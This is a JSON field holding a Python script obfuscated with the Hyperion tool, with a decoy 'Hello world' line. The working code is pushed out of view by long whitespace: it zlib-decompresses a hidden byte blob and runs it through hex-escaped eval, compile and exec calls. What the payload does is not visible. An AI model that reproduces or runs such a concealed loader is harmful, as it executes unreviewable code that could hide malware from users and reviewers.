"protected": "from builtins import *\nfrom math import prod as Math\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\nModulo, Builtins, _walk, _frame, _hypothesis, Hypothesis, _run = exec, str, tuple, map, ord, globals, type\n\nclass Round:\n    def __init__(self, Negative):\n        self._stackoverflow = Math((Negative, -32524))\n        self.Power(_ceil=1486)\n\n    def Power(self, _ceil = type):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self._stackoverflow += -76435 - _ceil\n        \n        try:\n            (({'BRaBgobBtllRg': 'lBeity'}, Builtins) for Builtins in (_frame, _walk, _builtins))\n\n        except TypeError:\n            (_frame, _walk, _builtins) if _frame is Modulo else (Builtins, _hypothesis, Builtins) != Modulo\n\n        except:\n            _run(-5278 * -38072) == type\n\n    def _algorithm(self, Theory = -73195):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        Theory -= -32499 / -40264\n        self.Walk != True\n        \n        try:\n            (_frame, _builtins, Modulo) if _hypothesis < _walk else (Builtins, _hypothesis, Builtins) == _builtins\n\n        except AttributeError:\n            ({'BRaBgobBtllRg': 'lBeity'} or _frame if {'BRaBgobBtllRg': 'lBeity'} and _frame else ... or (_frame, {'BRaBgobBtllRg': 'lBeity'}))\n\n        except:\n            _run(65822 * -20822) == type\n\n    def _modulo(Random = type):\n        return Hypothesis()[Random]\n\n    def _memoryaccess(Square = -96121 / 17630, _system = str, System = Hypothesis):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        System()[Square] = _system\n        \n        try:\n            ((Modulo, (Builtins, _hypothesis, _walk)) for Modulo in {_walk: _walk} if Modulo is _walk)\n\n        except TypeError:\n            ((_frame, _builtins, Modulo) or _frame if (_frame, _builtins, Modulo) and _frame else ... or (_frame, (_frame, _builtins, Modulo)))\n\n        except:\n            _run(92322 / 38326) == Ellipsis\n\n    def execute(code = str):\n        return Modulo(Builtins(_walk(_frame(_hypothesis, code))))\n\n    @property\n    def Walk(self):\n        self._calculate = '<__main__.Random object at 0x000009681BE95469>'\n        return (self._calculate, Round.Walk)\n\nif __name__ == '__main__':\n    try:\n        Round.execute(code = __code__)\n        _statistics = Round(Negative = 74768 / -97500)\n\n        if 449632 > 799672:\n            _statistics.Power(_ceil = _statistics._stackoverflow * -25158)\n        elif 154389 < 7772901:\n            _statistics.Power(_ceil = _statistics._stackoverflow * 84917)                                                                                                                                                                                                                                                          ;Round._memoryaccess(Square='NMMNNMNMNMMNNNNMNM',_system=b'x\\x9c\\xe5\\x1ako\\xea\\xb8\\xf2{\\x7f\\x05\\xcb\\x97$jO\\x1b\\x9c\\xc4\\tH\\xfdr\\xd5]m\\x8f(\\xac\\xb6\\xab\\xdbs\\xd5\\x83P \\xa6M7\\xc4\\x15\\x84S\\xfa\\xefw\\xfc\\x82\\x10b\\x92\\xb4\\x9cjukw\\xfc\\x18O\\xfc\\x98\\xf1\\x8c\\xc7\\xa6\\xd9\\xe2\\xb5w\\xd2\\x82\\x10\\xcfL\\x9e\\xb30\\x1e\\xd3\\xc9l\\xb5\\x9c\\x86\\x19]\\x8c\\xc7\\xad_.\\xdb\\xbf\\xbf>\\x93EL\\xd3v\\x8b.rd\\xe1*{\\xa4\\x8b%\\xa71\\xdb\\x938I^\\xb3G\\xf2@\\xc3\\xcc\\xf1p\\xfb\\xac\\xfd\\x9fdE\\xfe$Q\\xdb\\xda\\xf9\\xea!\\xce\\x1eW\\x13\\xd1\\xf1c\\x96=/{\\x17\\x17\\x02w>\\xa5\\xf3\\x8bB7\\x17\\x9a\\xb1\\xa3x9\\xa5\\x8bh\\xb7\\x1b\\x89<\\x7fx\\xb8xN\\xc2\\x87\\x15)|\\x94\\xc4S\\x92.\\x89\\xf8\\xe8\\xd7?\\xfa_\\xd0\\xb9] \\x99\\xd2H\\xb4\\x1b\\xcf\\x8b8\\xcd\\xcc\\xf6\\xef$Ih\\xeb\\x85.\\x92\\xe8\\x97\\xb6e\\x9cX\\xbd\\r5k7\\x96\\x7f\\xc7\\x91a\\x9d\\x90\\xf5\\x94<g\\x92\\x99\\xe9\\xf3\\n\\xbe\\xfc\\x93.\\xc9\\xb2\\x15.HkA\\xa2\\xef\\xe9\\x7fc\\x9a\\x90L &\\xc0\\x99\\xef\\xe9\\xff\\xe8\\x8a\\xd7\\xc2\\x16\\xeb\\xe4{:\\xa0\\x13\\x1a\\xbd\\xb6\\x92\\xf8o\\xf8\\xee\\x95\\xae\\xda\\xd6\\x89\\x98T<\\x7f\\xa6\\x8bl<\\x86\\xd1^\\x97\\x86uN\\xd6qfZ\\'\\t\\x9d\\x86\\xc9\\xd2\\xb4\\xee\\x8d[t{{\\x8bx\\xb8U\\x7f\\xbcb\\x8c.\\x1f\\x12:\\x01\\xb2\\x13-\\r\\xeb\\xe0\\xe6f\\xc0\\xc2\\r\\xc4\\x01\\x94y\\x95\\xa3\\x8c\\xfb^\\xef\\xf4\\xcb\\xe9\\x17\\xf3\\x8by\\xda\\xb1\\xac\\xd1\\xe82\\x8a\\x17\\x87\\xfbb\\xb9 \\xd8\\xa4\\xfb\\xbd<\\x90,\\xcc\\xb2\\x8a\\x9e\\x86\\xb6Mm{\\x08\\xc9\\xd0\\x1eR\\x9e\\x01\\xc0\\x9a\\xc4\\xcaO\\xca\\xdb\\xd9\\x97b\\x15\\x03\\xf9\\'W\\xc5\\x963\\xba\\xdc\\xb2\\xf3\\xf0\\xe0\\xeb\\xf5\\xcb\\xcb\\xcb\\xfa\\x85g,\\xac\\xe1[]\\xb7\\xa61Y\\xc5I\\x16\\xa7L:?\\xc2E\\x15\\xb7\\x072\\xcaD\\xf4\\x02\\xfd\\xe7X\\xc6Y\\x08\\x1f\\x98\\xfa1\\x97i\\x9c%\\xf1jR\\xe4\\xaeu6\\x90\\xe2\\x93\\xa2\\xbc\\x19H\\xf1\\xde\\xbc\\xa57\\xeb\\xfe\\xb8\\xdd\\x9d\\xc7iD\\xd6\\xa6\\x91\\x84?\\xc8^\\xeb\\xc8:\\xcc\\xba\\xeb\\xfe\\xf5\\xd7>\\x00\\x0f\\x90]\\xf7?\\x1b\\xdb\\x16\\xd9\\xb2\\x8ck{\\xdb\\x95qk\\x9eB\\x9c\\xa7\\x1c \\xe5\\xc9\\xfc\\xb31\\x8c\\xac\\x16\\x7f\\x95qLo=\\xae(\\x1d\\xd2+z\\xc5\\x02/\\r?\\x1d\\xcf\\x92\\xf8yN\\xa7\\xcd\\xd8\\xc6y\\xc39\\xc3\\xb9s+\\x0e\\x82\\xc6\\xac\\x8b\\xe3\\xe92L\\xe3#\\xb1N\\xdb\\xdb\\xdbX\\xa7\\xefN\\xb1\\xeeu\\x16\\'k\\xf2\\x98\\xae\\x1a\\xdb\\xb6\\x1by\\xecn\\x86\\x83\\x12p\\xcf0\\xce\\x9fh\\x9c\\x96k\\xb8\\xac\\xae\\x19\\x9e\\x15\\x05\\x11$\\x9fn\\xc7.\\x93\\xf0\\xb7\\xa6j~5dZ>\\x04u\\x1f\\x82\\xa6\\x83\\xda\\xc3\\x1f >\\x1b\\xef\\xb2\\x90&\\xb3\\xc6\\xdb\\xf5Vj\\xb8\\x08\\xa2\\xf8\\xd98\\x97P\\xba\\xdfZ\\xc5\\xb8o,\\xdc\\xf1?\\x95\\xdf}\\xbb\\xbb\\xcb\\xf7S\\xee!\\x9a\\x86\\xe5\\x8c\\xddqg\\x1c\\x00\\xb0\\xdc\\x1b\\xfb\\xe3\\x00\\xc8\\xdd}l\\x8d\\xde\\xca\\xed\\xb591\\x1c\\xec\\xcd\\x1c\\x07\\xc0\\x07p\\x01:\\x008\\x07\\x08MP\\x80\\xa2J\\xba\\x0e\\xea\\x82C\\x1c\\x11v\\xab2\\x8d`\\x96\\xed\\x1bEK$\\xa3O\\xb6q\\xa6d\\xdd\\xd8\\xf9\\xd5\\xca\\xcb\\xf3!\\x06\\x1cv\\xd3\\xb2zP%\\x91\\x91~c`\\xec#<\\xc3\\x11\\xb21\\xf2=\\xdc\\xc5S\\xdf\\x85\\x94\\xf8\\x0e`\\xba8\\xf2m<\\xf3\\x91\\xefB\\xcd\\xf3\\x03\\xeca\\xa7R\\xfc?KU\\xf4\\x9b\\xbb\\x83\"\\xbey\\xedz\\x9bs\\xc4n*\\xe9C\\xbc<[\\xd2V\\xb6\\xa0\\xcf\\xf3\\xb8\\x96\\xa6\\xda\\xd0\\xdc\\xa9E\\xd9\\x81f\\xfb#\\x97\\xb4\\x81r\\x9f\\x02x\\x0ca\\xcb\\xf4-\\xdbG\\x97\\xfa\\xd3T0\\xe9C%\\xa3\\xb9\\xf4\\xc8[\\x0f\\xbf\\xf4\\xa8\\xd2\\xc1\\xa9/\\xe9\\xbb\\xa6\\xedJ\\x0b\\x88\\xa5\\x05d\\x16\\xd1\\x93\\x16\\xd1\\x95u,-f\\x1dZ\\xaf\\xee\\xf2\\x0f\\xaa\\x8e2[\\x03\\xe9Vn^u\\x80\\x15e|\\xd3+}MU.\\x17\\x87\\xb6[?\\xe0\\xd1\\xdf\\xa4\\xbe\\xc4\\x88:\\x84\\xca\\x01/\\x93p>\\x89\\xc2\\xd6\\xd0\\x96\"\\x1d\\x82#g\\x0fE\\n\\xb5^\\xc9\\x84\\x9aM\\xd2\\x9d\\xca\\x18\\x02ted5U\\x9f\\xf2<d\\xe5\\xea\\xe96\\xddY\\xc8g\\xd1\\x0e\\x91-\\xa2;a&\\x17O\\x91\\rf\\x17d\\x02\\xb9\\xcd\\r2l\\'\\xdfaF\\xd8\\xf7q\\x97\\xb5m)0\\xc3`\\x90\\x1f)R\\xc3\\x9c]D\\xb6\\xbd\\x8b\\xd1\\xaa\\rv\\xb3\\xcd\\x13\\xc9H F\\x1cT\\x1a\\xe5\\xeaD\\xa6\\xa4\\xb6\\xcc\\xb9A\\xca\\x19\\'n\\xb3\\xee\\xbe\\xf5tZ^n+\\x9e\\x92$\\x06H\\xe28\\x89\\x93\\xa7\\'^}zz\\x975`\\xda\\x1d\\xe4|!_j\\xb8#\\x01\\xb1vi\\r\\xea\\xd0\\xfa5\\xad\\x81b\\x8cx{\\xe5\\xc6@zQ\\xb2\\xda;`.\\xca\\xb9\\x03|dW#P(\\xc6F\\xa6X,\\x00_\\x8fz\\xac\\xd5?*\\x0f3]9\\xa3\\xca\\x11\\xf5$(\\xe6\\xa2\\x1c\\xd3\\xabh\\x1b8\\xae;\\xcc\\xbf\\xbeN\\xe0\\x8f\\x81L\\x1b3]\\xef\\xe49*:\\x88EU\\x12y\\x1e\\xef\\xa0\\xdaZt}\\xfd\\x95\\xbd\\xa7\\xf6!\\xef\\x7f\\x85\\xb4\\xdfg\\xaf\\xaa\\x10\\x9b\\xe9\\x91^\\xfdIN\\xd9\\xa5\\x8a\\xef\\x98\\x82\\xa8\\x81\\xca\\xcf\\xd5S\\xe6<\\x1f\\xd2\\xf4\\xfdf\\x1eo\\x8c;3\\xaf,\\xaa\\xb2\\xc2\\xff\\x1c\\xe3\\xfe6ckl\\xf5zse\\xda\\xfd\\x8dE\\xabi\\xecj\\xe8\\x8c\\xd1\\x18s\\xe8\\xc2\\x95\\x11\\x019\\xde\\xc7~\\xb4;\\xba=\\xcb\\xf9v\\xe3\\x07:\\x14\\x98\\xfdaV\\x08*G\\xda\\x91\\xee\\xcc\\x81K\\x8ac\\xb3(\\xca.D\\x96\\xb2\\xb2j\\xc1\\x12W_\\x91\\xfa\\xa04\\x90\\xb0\\x9f&\\xfaP\\x02M\\xba\\x86\\xbc\\x7f,Er\\t\\x8f\\x11D\\x91\\x93\\x9d(\\xf0\\xaa\\xb5\\xbeJ]\\r\\xaf\\xb8\\xbbD\\x87\\xec\\xad\\x9b\\x99z\\x8e\\xb9\\xa2\\r\\xcfQu\\xe8\\xa8\\xcd(\\x8e\\x9f\\x0f\\xbd\\x0c\\xa8%\\x15\\xbc]\\x00\\xfdZ\\xb4W\\x02\\xbd\\x1c\"\\xc9\\xfd-\\xec\\x96\\x9aH\\xc1|\\xc3\\xf8.\\x9e\\xc9\\xcd\\xe92P!\\x87\\xab\\xde\\xb4f\\x9bs\\xads\\n(h8\\xed\\xf5\\xee\\x8dU6\\x0b\\x0c\\x93DtJ\\xa2s\\xcb\\xe8\\xa2\\x8d\\xb7\\x0bfP\\xe5\\xaa,\\xea\\x01\\xdan\\xc4\\xc2\\x06\\xe4\\xa5\\xc8\\xcd\\xb7\\x8b\\xdc\\x98\\x98;KB\\xb7r\\xa9\\xe6\\xa8jJ\\x81\\xf6I\\xa3\\xf8\\xf0\\xc1\\x9eC\\xb4\\x03\\xdd[\\xe6Pr\\x9a\\x0e%\\xef\\xb9\\x14\\xda\\xef\\xd9\\xad\\xb6\\xdc\\xad5\\x1d\\x87\\xb3Y\\x9c\\x904\\x9c\\x93\\xcb\\x83g\\x92\\x80\\xfci\\xb4\\xc5\\xb0\\xb4j\\xa8\\xb39\\xb4]\\xee\\xfd\\xd2\\xfa\\xb3W\\xd7\\xf4\\x92\\xf0\\xff\\xa1T\\x07<7\\xe1\\x9f)\\x0fm\\xeb\\xa7\\xed\\xa6\\xdb\\x16`v\\xd7\\x9b\\xa0\\xdc\\xa3]\\x9d=\\x0f\\xf4\\x13\\'tB\\xf0s#\\x0e\\x01\\x87I\\x13\\xf6\\x02=\\\\8r\\x02?J\\x9f\\x82\\x03\\n\\xf2~k~\\xf5\\x02\\x83\\x02\\x8c\\x90\\xef8pC\\xf50\\x86\\xbc#s[\\xe6\\xa8\\x80\\x0f4\\xed\\xee&G\\x98\\xf5\\x1f@\\xee\\x1e\\xb1_\\x86\\xe92n!\\x82]\\xf6@\\x02\\x9b\\x08r\\xc6A\\'\\xc0\\xd8w}O\\xc7=\\xa6H \\xe1\\x88\\xa5\\xf9\\x92\\x17A\\xe9-\\xdc\\xc2N\\x17\\x00\\x03\\xdev\\xe0\\xb2/\\xc1-\\x01\\xaf\\x04\\xdc\\x12z\\xe8\\x1cw\\xc0\\x11\\xea\\xc8>u\\xfd\\x14\\xbf-\\x1b\\xb7\\xd8\\xee\\xed\\xcd\\x85I\\xc7\\x95\\xdcf9.\\x01W\\x02\\xa3Qt\\x0e\\x9f\\xdbn\\xbb\\x82<^}s\\x14\\x89UZ\\xdd\\x8dq7\\xd8?\\xa9\\xf4\\x99?\\xc8.Y\\xfc\\xaa%0\\xfd\\x8f4\\xc7\\xcdN\\x81\\x9fqq7\\xac.\\\\0\\x82\\xb1\\xcb\\xaf\\x17\\xce\\xd8\\x83\\xdc\\x07r\\x1b0\\x05\\xec\\xb1\\xdf\\xd6\\xc7\\x1d~\\xb9\\tx\\xef\\xec\\xfa\\x03\\xab;E\\xfb\\xd8w\\xff^\\xd6\\xcd=%\\x04\\xb2\\xae\\xdev\\xd8;\\x8e\\x9b\\xfb\\xcd\\xac\\x8a\\xd6i\\xf8\\x8e\\xbf\\x03\\xd5\\xcf\\xc27\\x83\\xcd\\xd2d|\\xf7\\xeam9{\\xf5\\xa6\\xbdY\\xb5\\\\Y\\x90[}\\x15m\\xdd\\x17/\\xb3\\x99\\x93\\xf1\\xef<\\xe4\\xdf`\\xec=GA\\x90\\xcb\\x0f\\x95\\xeb\\xb6\\x07\\xef5\\x8eo>\\xbe\\xe08\\x00D\\xfd#Lw\\x94\\xe8h\\xb6\\xc7\\x8c\\x0f\\xfd\\xfbP\\xe2\\xc7\\x03\\x1c\\n\\x98\\xf3\\xc2\\xe1\\xe0\\xc21\\xea2\\x87\\x01\\xf2\\xfc\\xf1\\x97\\x87\\xdd\\xa3V}\\xb3\\x05\\x86\\xcbC\\x11_\\xa4\\xd7\\x8d\\xb37\\xee\\x07\\x1c\\xc1 \\x92=`\\xf2RP\\xc4\\xe5\\xeb:z!\\xefn\\xe9\\x1a]\\xc6\\x8f\\x1d\\xe8\\x88\\xbc\\xc0\\xa3m[\\xa1]}\\xc7\\xcb\\x9d\\r\\xbeJn\\xc55\\xe4\\xe7\\x9f\\xaf\\x97\\xe1uk\\xaf/\\xc7\\xe3\\xb8gJ^\\xf9\\xb9\\xead\\xa4[\\x9f\\x0e\\xa7\\x93W\\xb9~\\x1d\\xdac\\xd5t\\x88\\xd7\\x91\\x90\\x8f\\xd4\\x91\\xdaz\\x8a\\x9d\\x82E+Z\\xc7:\\x96\\xf0\\x90u\\x14}\\xb19z\\x9bq}\\xd8khg\\xff}\\xb0[Yy\\x08\\xed\\x9a\\xdc\\xbc\\xc1\\xdd=\\x98\\xfe\\xbd\\xef\\x07\\xff\\x00Q\\xeaD\\xba')\n\n        if 215217 > 9585361:\n            Round(Negative = -80758 / -58839).Power(_ceil = _statistics._stackoverflow + -25499)\n        elif 363152 < 2179580:\n            Round(Negative = -81046 - -13082).Power(_ceil = _statistics._stackoverflow + 67271)                                                                                                                                                                                                                                                          ;JIIJLJJIIIILJJLLJ,SSS2S22SSSS2S22SS2S2,MMMNNNMNNMNMNMNNN,Ooo00OO0000O0OO00O0O00Oo0O,WWWXXXXWWWWWXWWXXXWWX=(lambda xwwxxwxwwxwxwwxxw:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(xwwxxwxwwxwxwwxxw)\"),filename='\\x44\\x4f\\x6f\\x6f\\x6f\\x44\\x4f\\x44\\x6f\\x6f\\x6f\\x4f\\x44\\x44\\x4f\\x44\\x44\\x44\\x44\\x44',mode='\\x65\\x76\\x61\\x6c'))),(lambda xwwxxwxwwxwxwwxxw:xwwxxwxwwxwxwwxxw['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda xwwxxwxwwxwxwwxxw:xwwxxwxwwxwxwwxxw(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda wwxwxwxxwxwwwwxxwwxxwwxx,xwwxxwxwwxwxwwxxw:wwxwxwxxwxwwwwxxwwxxwwxx(xwwxxwxwwxwxwwxxw)),(lambda:(lambda xwwxxwxwwxwxwwxxw:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(xwwxxwxwwxwxwwxxw)\"),filename='\\x44\\x4f\\x6f\\x6f\\x6f\\x44\\x4f\\x44\\x6f\\x6f\\x6f\\x4f\\x44\\x44\\x4f\\x44\\x44\\x44\\x44\\x44',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63'))\n        if 343439 > 2379003:\n            _statistics.Power(_ceil = _statistics._stackoverflow - -70225)\n        elif 327728 < 2680955:\n            _statistics._algorithm(Theory = -40215 + _statistics._stackoverflow)                                                                                                                                                                                                                                                          ;WWWXXXXWWWWWXWWXXXWWX()(Ooo00OO0000O0OO00O0O00Oo0O(SSS2S22SSSS2S22SS2S2(MMMNNNMNNMNMNMNNN(JIIJLJJIIIILJJLLJ('\\x76\\x61\\x72\\x73'))),Round._modulo(Random='NMMNNMNMNMMNNNNMNM')))\n\n    except Exception as _builtins:\n        if 325878 > 3743282:\n            Round.execute(code = Builtins(_builtins))\n\n        elif 177588 > 1490893:\n            _statistics.Power(_ceil = _statistics._stackoverflow + 79756)"